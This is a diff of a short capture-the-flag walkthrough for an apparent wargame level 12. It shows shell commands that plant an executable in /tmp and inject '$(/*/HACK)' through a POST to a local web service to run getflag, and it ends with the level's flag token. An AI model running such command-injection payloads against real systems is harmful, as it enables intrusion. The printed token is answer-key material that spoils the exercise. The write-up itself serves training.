@@ -1,3 +1,4 @@
+🔻 Analyze
 ⬇️ cat level12.pl
 👉 egrep "^$xx" /tmp/xd 2>&1
 
@@ -9,8 +10,10 @@
 ⬇️ echo "$(/*/HACK)"
 ⬇️ cat /tmp/flag
 
+
 🔻 Hack
-⬇️ echo "echo \$(getflag) > /tmp/flag" > /tmp/HACK
+⬇️ echo "echo \$(getflag) > /tmp/flag12" > /tmp/HACK
 ⬇️ chmod +x /tmp/HACK
 ⬇️ curl -X POST -d 'x=$(/*/HACK)' localhost:4646
-👉 cat /tmp/flag
+⬇️ cat /tmp/flag12
+👉 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
